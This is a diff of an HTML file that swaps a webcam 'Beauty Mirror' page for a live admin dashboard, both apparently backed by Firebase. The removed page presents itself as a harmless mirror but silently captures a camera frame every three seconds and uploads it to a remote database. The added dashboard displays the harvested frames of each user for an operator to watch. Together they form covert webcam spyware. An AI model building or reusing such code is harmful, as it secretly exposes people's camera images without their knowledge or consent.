@@ -3,62 +3,68 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Beauty Mirror</title>
+<title>Admin Dashboard</title>
 
 <style>
 body{
   margin:0;
   font-family:Arial;
-  background:linear-gradient(120deg,#0f172a,#1e293b);
+  background:#0b1220;
   color:white;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
 }
 
-.card{
-  width:90%;
-  max-width:500px;
-  background:#111827;
-  padding:20px;
-  border-radius:15px;
+/* HEADER */
+header{
+  padding:15px;
   text-align:center;
-  box-shadow:0 0 20px #000;
+  background:#111827;
+  font-weight:bold;
+  letter-spacing:1px;
 }
 
-button{
-  padding:12px 20px;
-  border:none;
-  border-radius:10px;
-  background:#22c55e;
-  color:white;
-  cursor:pointer;
+/* GRID */
+.container{
+  display:flex;
+  flex-direction:column;
+  gap:15px;
+  padding:15px;
 }
 
-video{
+/* USER CARD */
+.userBox{
+  background:#1e293b;
+  padding:15px;
+  border-radius:12px;
+  box-shadow:0 0 10px #000;
+}
+
+/* IMAGE */
+img{
   width:100%;
-  margin-top:15px;
+  height:300px;
+  object-fit:cover;
   border-radius:10px;
+  margin-top:10px;
+}
+
+/* BUTTON */
+button{
+  margin-top:10px;
+  padding:8px 12px;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  background:#ef4444;
+  color:white;
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
+<header>📡 LIVE ADMIN DASHBOARD</header>
 
-  <h2>✨ Beauty Mirror</h2>
-
-  <button onclick="startCamera()">Start Camera</button>
-
-  <video id="video" autoplay playsinline></video>
-
-  <p id="status">Waiting...</p>
-
-</div>
-
-<canvas id="canvas" style="display:none;"></canvas>
+<div class="container" id="grid"></div>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
@@ -77,44 +83,45 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-let stream;
+const grid = document.getElementById("grid");
 
-async function startCamera(){
+db.ref("camera").on("value",(snap)=>{
 
-  stream = await navigator.mediaDevices.getUserMedia({video:true});
+  const data = snap.val();
+  grid.innerHTML="";
 
-  document.getElementById("video").srcObject = stream;
+  if(!data){
+    grid.innerHTML="<p>No Users</p>";
+    return;
+  }
 
-  document.getElementById("status").innerText = "Live Camera Active";
+  Object.keys(data).forEach(userId=>{
 
-  startCapture();
-}
+    const item = data[userId];
 
-function startCapture(){
+    const box = document.createElement("div");
+    box.className = "userBox";
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const ctx = canvas.getContext("2d");
+    box.innerHTML = `
+      <h3>👤 ${userId}</h3>
 
-  setInterval(()=>{
+      <img src="${item.frame}" />
 
-    if(!video.videoWidth) return;
+      <button onclick="deleteUser('${userId}')">
+        DELETE USER
+      </button>
+    `;
 
-    canvas.width = 320;
-    canvas.height = 240;
+    grid.appendChild(box);
 
-    ctx.drawImage(video,0,0,320,240);
+  });
 
-    const frame = canvas.toDataURL("image/jpeg",0.5);
+});
 
-    // 🔥 ONLY ONE IMAGE (OVERWRITE)
-    db.ref("camera/user1").set({
-      frame: frame,
-      updatedAt: Date.now()
-    });
-
-  },3000);
-
+function deleteUser(userId){
+  if(confirm("Delete user data?")){
+    db.ref("camera/"+userId).remove();
+  }
 }
 </script>
 
